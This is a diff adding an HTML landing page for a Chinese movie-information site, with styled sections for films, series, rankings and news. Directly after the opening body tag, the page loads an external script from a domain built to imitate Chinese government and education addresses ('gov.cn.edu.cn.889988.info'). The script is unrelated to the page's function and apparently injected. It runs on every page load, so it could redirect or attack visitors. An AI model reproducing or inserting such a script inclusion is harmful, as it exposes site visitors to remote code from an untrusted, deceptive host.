@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="ok电影网（okdianyingwang-app）是专注于高清电影、热播电视剧、动漫综艺在线观看的影视门户，提供最新影视资讯、票房排行与观影指南。">
+<meta name="keywords" content="ok电影网, okdianyingwang-app, 电影在线观看, 最新电影, 电视剧, 影视资讯">
+<meta name="author" content="ok电影网">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#0b1020">
+<title>ok电影网 - 高清电影·电视剧·动漫在线观看 | okdianyingwang-app</title>
+<link rel="canonical" href="https://okdianyingwang-app.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "ok电影网",
+  "alternateName": "okdianyingwang-app",
+  "url": "https://okdianyingwang-app.github.io/",
+  "description": "ok电影网提供高清电影、电视剧、动漫、综艺的在线观看与影视资讯。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://okdianyingwang-app.github.io/?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+  :root{
+    --bg:#07091a;
+    --bg2:#0d1230;
+    --card:#12193f;
+    --line:rgba(255,255,255,.08);
+    --txt:#e8ebff;
+    --sub:#9aa4c4;
+    --gold:#ffb547;
+    --cyan:#3ee0d0;
+    --pink:#ff5c9d;
+    --radius:18px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    line-height:1.7;
+    overflow-x:hidden;
+    background-image:radial-gradient(900px 500px at 80% -10%,rgba(78,64,255,.28),transparent 60%),
+      radial-gradient(700px 400px at 0% 20%,rgba(255,92,157,.14),transparent 55%);
+    background-attachment:fixed;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:1160px;margin:0 auto;padding:0 20px}
+
+  /* Header */
+  header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);background:rgba(7,9,26,.72);border-bottom:1px solid var(--line)}
+  .nav{display:flex;align-items:center;gap:18px;height:64px}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+  .logo mark{background:linear-gradient(135deg,var(--gold),var(--pink));color:#1a0b2e;padding:3px 9px;border-radius:9px;font-size:15px}
+  .logo span{font-size:19px;background:linear-gradient(90deg,#fff,var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+  .menu a{padding:8px 13px;border-radius:999px;font-size:14px;color:var(--sub);transition:.25s}
+  .menu a:hover{color:#fff;background:rgba(255,255,255,.08)}
+  .search{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,.06);border:1px solid var(--line);border-radius:999px;padding:7px 14px;width:190px}
+  .search input{background:none;border:none;outline:none;color:#fff;width:100%;font-size:14px}
+  .search input::placeholder{color:#6f7899}
+
+  /* Hero */
+  .hero{position:relative;padding:70px 0 60px;text-align:center}
+  .hero h1{font-size:clamp(30px,6vw,54px);line-height:1.15;font-weight:900;letter-spacing:-.5px}
+  .hero h1 em{font-style:normal;background:linear-gradient(100deg,var(--gold),var(--pink) 55%,var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .hero p{color:var(--sub);max-width:640px;margin:18px auto 0;font-size:16px}
+  .tags{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:26px}
+  .tags b{font-size:13px;padding:6px 14px;border:1px solid var(--line);border-radius:999px;color:var(--sub);background:rgba(255,255,255,.03)}
+  .cta{margin-top:30px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+  .btn{padding:13px 28px;border-radius:999px;font-weight:700;font-size:15px;transition:.25s;display:inline-flex;align-items:center;gap:8px}
+  .btn-primary{background:linear-gradient(135deg,var(--gold),var(--pink));color:#1a0b2e;box-shadow:0 10px 30px -10px rgba(255,92,157,.7)}
+  .btn-primary:hover{transform:translateY(-2px)}
+  .btn-ghost{border:1px solid var(--line);color:#fff}
+  .btn-ghost:hover{background:rgba(255,255,255,.06)}
+
+  /* Section */
+  section{padding:54px 0}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+  .sec-head h2{font-size:24px;font-weight:800;display:flex;align-items:center;gap:10px}
+  .sec-head h2 i{width:5px;height:22px;border-radius:4px;background:linear-gradient(var(--gold),var(--pink))}
+  .sec-head a{font-size:13px;color:var(--cyan)}
+  .grid{display:grid;gap:20px}
+  .g4{grid-template-columns:repeat(4,1fr)}
+  .g3{grid-template-columns:repeat(3,1fr)}
+  .g2{grid-template-columns:repeat(2,1fr)}
+
+  .card{background:linear-gradient(180deg,var(--card),rgba(18,25,63,.4));border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.3s;display:flex;flex-direction:column;height:100%}
+  .card:hover{transform:translateY(-6px);border-color:rgba(255,181,71,.4);box-shadow:0 20px 40px -20px rgba(0,0,0,.6)}
+  .thumb{position:relative;aspect-ratio:3/4;overflow:hidden;background:linear-gradient(135deg,#1c2557,#2a1a4a)}
+  .thumb::after{content:"";position:absolute;inset:0;background:
+    radial-gradient(circle at 30% 25%,rgba(255,255,255,.18),transparent 40%),
+    radial-gradient(circle at 75% 80%,rgba(255,92,157,.25),transparent 45%)}
+  .thumb .play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:38px;opacity:.85;z-index:2}
+  .thumb .badge{position:absolute;top:10px;left:10px;z-index:3;font-size:12px;font-weight:700;padding:3px 9px;border-radius:7px;background:rgba(0,0,0,.55);backdrop-filter:blur(4px)}
+  .thumb .score{position:absolute;top:10px;right:10px;z-index:3;font-size:12px;font-weight:800;padding:3px 9px;border-radius:7px;background:var(--gold);color:#2a1a00}
+  .card-body{padding:14px;display:flex;flex-direction:column;gap:6px;flex:1}
+  .card-body h3{font-size:16px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .card-body .meta{font-size:12px;color:var(--sub);display:flex;gap:8px;flex-wrap:wrap}
+  .card-body p{font-size:13px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+  /* Genre pills */
+  .genres{display:flex;gap:10px;flex-wrap:wrap}
+  .genre{flex:1 1 150px;min-width:140px;padding:20px;border-radius:var(--radius);background:linear-gradient(150deg,var(--card),rgba(18,25,63,.3));border:1px solid var(--line);transition:.25s;display:flex;flex-direction:column;gap:6px}
+  .genre:hover{border-color:var(--cyan);transform:translateY(-4px)}
+  .genre b{font-size:17px}
+  .genre small{color:var(--sub);font-size:12px}
+
+  /* Ranking */
+  .rank{display:flex;flex-direction:column;gap:12px}
+  .rank-item{display:flex;align-items:center;gap:14px;padding:12px;border-radius:14px;background:rgba(255,255,255,.03);border:1px solid var(--line);transition:.25s}
+  .rank-item:hover{background:rgba(255,255,255,.07)}
+  .rank-num{font-size:22px;font-weight:900;width:34px;text-align:center;flex:none;
+    background:linear-gradient(135deg,var(--gold),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .rank-num.n1{color:#ffb547;-webkit-text-fill-color:#ffb547}
+  .rank-info{flex:1;min-width:0}
+  .rank-info h4{font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .rank-info small{color:var(--sub);font-size:12px}
+  .rank-bar{height:6px;border-radius:6px;background:rgba(255,255,255,.1);margin-top:7px;overflow:hidden}
+  .rank-bar i{display:block;height:100%;border-radius:6px;background:linear-gradient(90deg,var(--cyan),var(--gold))}
+
+  /* News */
+  .news{display:flex;flex-direction:column;gap:16px}
+  .news-item{display:flex;gap:16px;padding:16px;border-radius:14px;border:1px solid var(--line);background:rgba(255,255,255,.02);transition:.25s}
+  .news-item:hover{border-color:rgba(255,92,157,.4);background:rgba(255,255,255,.05)}
+  .news-date{flex:none;width:56px;height:56px;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--bg2),#1c1238);border:1px solid var(--line)}
+  .news-date b{font-size:18px;color:var(--gold);line-height:1}
+  .news-date small{font-size:11px;color:var(--sub)}
+  .news-item h3{font-size:16px;margin-bottom:4px}
+  .news-item p{font-size:13px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+  /* Features */
+  .feat{display:grid;gap:18px;grid-template-columns:repeat(4,1fr)}
+  .feat div{padding:22px;border-radius:var(--radius);background:rgba(255,255,255,.03);border:1px solid var(--line);transition:.25s}
+  .feat div:hover{transform:translateY(-5px);border-color:var(--gold)}
+  .feat .ic{font-size:30px;display:block;margin-bottom:10px}
+  .feat h3{font-size:16px;margin-bottom:4px}
+  .feat p{font-size:13px;color:var(--sub)}
+
+  /* Footer */
+  footer{border-top:1px solid var(--line);padding:44px 0 26px;margin-top:30px;background:linear-gradient(180deg,transparent,rgba(0,0,0,.35))}
+  .foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:26px;margin-bottom:26px}
+  .foot-brand p{color:var(--sub);font-size:13px;margin-top:10px;max-width:320px}
+  .foot-col h4{font-size:15px;margin-bottom:12px;color:#fff}
+  .foot-col a{display:block;font-size:13px;color:var(--sub);padding:4px 0;transition:.2s}
+  .foot-col a:hover{color:var(--cyan)}
+  .copyright{text-align:center;color:var(--sub);font-size:12px;border-top:1px solid var(--line);padding-top:20px}
+  .copyright b{color:var(--gold)}
+
+  /* Breadcrumb */
+  .bread{font-size:13px;color:var(--sub);padding:16px 0 0}
+  .bread a:hover{color:#fff}
+
+  /* Top link */
+  .top{position:fixed;right:18px;bottom:24px;width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--gold),var(--pink));color:#1a0b2e;font-size:20px;box-shadow:0 10px 26px -8px rgba(255,92,157,.7);z-index:40;transition:.25s}
+  .top:hover{transform:translateY(-4px)}
+
+  @media (max-width:900px){
+    .g4,.feat{grid-template-columns:repeat(2,1fr)}
+    .foot-grid{grid-template-columns:1fr 1fr}
+  }
+  @media (max-width:640px){
+    .nav{height:58px;gap:10px}
+    .logo span{font-size:16px}
+    .search{display:none}
+    .menu a{padding:7px 10px;font-size:13px}
+    .hero{padding:44px 0 40px}
+    .g4,.g3,.g2,.feat{grid-template-columns:1fr}
+    .foot-grid{grid-template-columns:1fr}
+    section{padding:40px 0}
+    .thumb{aspect-ratio:16/10}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#top" title="返回顶部">
+      <mark>OK</mark><span>电影网</span>
+    </a>
+    <nav class="menu">
+      <a href="#hot" title="热映电影">热映</a>
+      <a href="#tv" title="电视剧">剧集</a>
+      <a href="#rank" title="影视排行">排行</a>
+      <a href="#news" title="影视资讯">资讯</a>
+      <a href="#feature" title="网站特色">特色</a>
+      <a href="#about" title="关于我们">关于</a>
+    </nav>
+    <div class="search">
+      <span aria-hidden="true">🔍</span>
+      <input type="search" placeholder="搜索影片、演员、导演" aria-label="搜索">
+    </div>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="wrap">
+      <h1>畅享光影时光<br><em>ok电影网</em> · 高清影视在线观看</h1>
+      <p>ok电影网（okdianyingwang-app）汇聚院线大片、热播剧集、经典动漫与综艺，提供影片介绍、预告片、票房排行与观影指南，让每一次观影都轻松愉悦。</p>
+      <div class="tags">
+        <b>高清画质</b><b>每日更新</b><b>分类清晰</b><b>免费资讯</b><b>多端自适应</b>
+      </div>
+      <div class="cta">
+        <a class="btn btn-primary" href="#hot" title="立即观看热映电影">🎬 立即观看</a>
+        <a class="btn btn-ghost" href="#rank" title="查看影视排行榜">🏆 热播排行</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：热映电影 -->
+  <section id="hot">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2><i></i>热映电影</h2>
+        <a href="#" title="查看更多电影">查看更多 →</a>
+      </div>
+      <div class="grid g4">
+        <article class="card">
+          <div class="thumb"><span class="play">▶</span><span class="badge">IMAX</span><span class="score">9.2</span></div>
+          <div class="card-body">
+            <h3>星际回响</h3>
+            <div class="meta"><span>科幻 / 冒险</span><span>2026</span></div>
+            <p>宇航员穿越虫洞寻找人类新家园，一场关于时间与牺牲的太空史诗。</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><span class="play">▶</span><span class="badge">3D</span><span class="score">8.7</span></div>
+          <div class="card-body">
+            <h3>长安谜案</h3>
+            <div class="meta"><span>悬疑 / 古装</span><span>2026</span></div>
+            <p>盛唐夜宴突发命案，女讼师与不良人联手抽丝剥茧，揭开权贵秘辛。</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><span class="play">▶</span><span class="badge">动作</span><span class="score">8.4</span></div>
+          <div class="card-body">
+            <h3>极速追击</h3>
+            <div class="meta"><span>动作 / 犯罪</span><span>2026</span></div>
+            <p>跨城飙车追凶，90 分钟不间断高能，肾上腺素飙升的视听狂欢。</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><span class="play">▶</span><span class="badge">动画</span><span class="score">9.0</span></div>
+          <div class="card-body">
+            <h3>深海守护者</h3>
+            <div class="meta"><span>动画 / 奇幻</span><span>2026</span></div>
+            <p>少年误入海底王国，与巨鲸缔结契约，踏上拯救海洋的冒险旅程。</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：电视剧集 -->
+  <section id="tv">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2><i></i>热播剧集</h2>
+        <a href="#" title="查看更多剧集">查看更多 →</a>
+      </div>
+      <div class="grid g3">
+        <article class="card">
+          <div class="thumb"><span class="play">▶</span><span class="badge">更新至 28 集</span></div>
+          <div class="card-body">
+            <h3>南风知我意</h3>
+            <div class="meta"><span>都市 / 爱情</span><span>40 集</span></div>
+            <p>建筑师与医生在异国重逢，从误会到相知，治愈系都市情感剧。</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><span class="play">▶</span><span class="badge">会员独享</span></div>
+          <div class="card-body">
+            <h3>边关烽火</h3>
+            <div class="meta"><span>历史 / 战争</span><span>36 集</span></div>
+            <p>小卒成长为守关名将，群像刻画乱世中的家国大义与兄弟情义。</p>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><span class="play">▶</span><span class="badge">完结</span></div>
+          <div class="card-body">
+            <h3>重案实录</h3>
+            <div class="meta"><span>刑侦 / 犯罪</span><span>24 集</span></div>
+            <p>真实案件改编，刑侦支队十年追凶，每一集都是一次人性拷问。</p>
+          </div>
+        </article>
+      </div>
+
+      <div class="grid g4" style="margin-top:20px">
+        <a class="genre" href="#" title="电影分类"><b>🎞️ 电影</b><small>动作 · 喜剧 · 科幻 · 恐怖</small></a>
+        <a class="genre" href="#" title="电视剧分类"><b>📺 电视剧</b><small>古装 · 都市 · 悬疑 · 历史</small></a>
+        <a class="genre" href="#" title="动漫分类"><b>🎨 动漫</b><small>热血 · 治愈 · 奇幻 · 科幻</small></a>
+        <a class="genre" href="#" title="综艺分类"><b>🎤 综艺</b><small>真人秀 · 脱口秀 · 竞演</small></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：影视排行 -->
+  <section id="rank">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2><i></i>影视排行榜</h2>
+        <a href="#" title="完整榜单">完整榜单 →</a>
+      </div>
+      <div class="grid g2">
+        <div class="card" style="padding:18px">
+          <h3 style="font-size:17px;margin-bottom:14px">🎬 票房榜 · 实时</h3>
+          <div class="rank">
+            <div class="rank-item"><span class="rank-num n1">1</span><div class="rank-info"><h4>星际回响</h4><small>科幻 · 12.8 亿</small><div class="rank-bar"><i style="width:96%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">2</span><div class="rank-info"><h4>长安谜案</h4><small>悬疑 · 9.4 亿</small><div class="rank-bar"><i style="width:78%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">3</span><div class="rank-info"><h4>深海守护者</h4><small>动画 · 7.1 亿</small><div class="rank-bar"><i style="width:62%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">4</span><div class="rank-info"><h4>极速追击</h4><small>动作 · 5.6 亿</small><div class="rank-bar"><i style="width:50%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">5</span><div class="rank-info"><h4>婚礼上的陌生人</h4><small>喜剧 · 3.9 亿</small><div class="rank-bar"><i style="width:38%"></i></div></div></div>
+          </div>
+        </div>
+        <div class="card" style="padding:18px">
+          <h3 style="font-size:17px;margin-bottom:14px">⭐ 口碑榜 · 评分</h3>
+          <div class="rank">
+            <div class="rank-item"><span class="rank-num n1">1</span><div class="rank-info"><h4>漫长的告白</h4><small>剧情 · 评分 9.4</small><div class="rank-bar"><i style="width:94%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">2</span><div class="rank-info"><h4>南风知我意</h4><small>爱情 · 评分 8.9</small><div class="rank-bar"><i style="width:82%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">3</span><div class="rank-info"><h4>边关烽火</h4><small>历史 · 评分 8.8</small><div class="rank-bar"><i style="width:76%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">4</span><div class="rank-info"><h4>重案实录</h4><small>刑侦 · 评分 8.6</small><div class="rank-bar"><i style="width:68%"></i></div></div></div>
+            <div class="rank-item"><span class="rank-num">5</span><div class="rank-info"><h4>宇宙尽头</h4><small>纪录片 · 评分 8.5</small><div class="rank-bar"><i style="width:60%"></i></div></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：影视资讯 -->
+  <section id="news">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2><i></i>影视资讯</h2>
+        <a href="#" title="更多资讯">更多资讯 →</a>
+      </div>
+      <div class="news">
+        <article class="news-item">
+          <div class="news-date"><b>07</b><small>10月</small></div>
+          <div>
+            <h3>《星际回响》票房破 12 亿，导演透露将拍续集</h3>
+            <p>影片上映三周持续领跑，IMAX 厅上座率居高不下。导演在采访中表示，续集已在前期筹备，故事将延续本片结尾的时空伏笔。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="news-date"><b>05</b><small>10月</small></div>
+          <div>
+            <h3>国庆档收官：悬疑类型崛起，观众口味正在变化</h3>
+            <p>今年国庆档总票房同比增长 14%，其中悬疑、科幻合计占比首次超过喜剧，年轻观众更偏好强情节、高概念的叙事。</p>
+          </div>
+        </article>
+        <article class="news-item">
+          <div class="news-date"><b>02</b><small>10月</small></div>
+          <div>
+            <h3>4K 修复版《大话西游》重映，经典何以常看常新</h3>
+            <p>全新 4K 数字修复让画面细节焕发新生，多地影院出现满场。影评人认为，其跨越时代的情感共鸣是长盛不衰的关键。</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：网站特色 -->
+  <section id="feature">
+    <div class="wrap">
+      <div class="sec-head"><h2><i></i>为什么选择 ok电影网</h2></div>
+      <div class="feat">
+        <div><span class="ic">🎯</span><h3>分类精准</h3><p>按类型、地区、年份、评分多维度筛选，快速找到想看的片子。</p></div>
+        <div><span class="ic">📱</span><h3>多端自适应</h3><p>手机、平板、电脑自动适配，通勤路上也能轻松追剧。</p></div>
+        <div><span class="ic">🔔</span><h3>每日更新</h3><p>院线动态、定档信息、播出进度同步更新，不错过热门。</p></div>
+        <div><span class="ic">💬</span><h3>真实口碑</h3><p>聚合观众评分与短评，帮你避开烂片、发现冷门佳作。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：关于 -->
+  <section id="about">
+    <div class="wrap">
+      <div class="card" style="padding:28px">
+        <h2 style="font-size:22px;margin-bottom:12px">关于 ok电影网（okdianyingwang-app）</h2>
+        <p style="color:var(--sub)">ok电影网（okdianyingwang-app）是一个专注于影视内容与观影服务的导航资讯站。我们致力于为影迷提供<b style="color:#fff">最新电影资讯、热播电视剧推荐、影视排行榜、影片介绍与观影指南</b>，涵盖电影、剧集、动漫、综艺四大频道。本站仅提供信息聚合与内容介绍，倡导支持正版、走进影院、合法观看。</p>
+        <p style="color:var(--sub);margin-top:10px">网站地址：<b style="color:var(--gold)">https://okdianyingwang-app.github.io</b>　｜　关键词：ok电影网、okdianyingwang-app、电影在线观看、最新电影、电视剧推荐。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <nav class="bread">
+      <a href="#top">首页</a> › <a href="#hot">电影</a> › <a href="#tv">电视剧</a> › <a href="#rank">排行榜</a> › <a href="#news">资讯</a>
+    </nav>
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="logo" href="#top"><mark>OK</mark><span>电影网</span></a>
+        <p>ok电影网 · okdianyingwang-app，你的随身影视指南。发现好电影，从 ok电影网 开始。</p>
+      </div>
+      <div class="foot-col">
+        <h4>频道</h4>
+        <a href="#hot">电影</a>
+        <a href="#tv">电视剧</a>
+        <a href="#tv">动漫</a>
+        <a href="#tv">综艺</a>
+      </div>
+      <div class="foot-col">
+        <h4>榜单</h4>
+        <a href="#rank">实时票房榜</a>
+        <a href="#rank">口碑评分榜</a>
+        <a href="#rank">期待榜</a>
+        <a href="#rank">经典榜</a>
+      </div>
+      <div class="foot-col">
+        <h4>关于</h4>
+        <a href="#about">网站简介</a>
+        <a href="#about">免责声明</a>
+        <a href="#about">联系我们</a>
+        <a href="#feature">服务特色</a>
+      </div>
+    </div>
+    <div class="copyright">
+      © 2026 <b>ok电影网</b>（okdianyingwang-app）· 网址：https://okdianyingwang-app.github.io　All rights reserved.<br>
+      本站为影视资讯导航站，不提供任何资源存储与下载服务，请支持正版影视。
+    </div>
+  </div>
+</footer>
+
+<a class="top" href="#top" title="返回顶部" aria-label="返回顶部">↑</a>
+
+</body>
+</html>
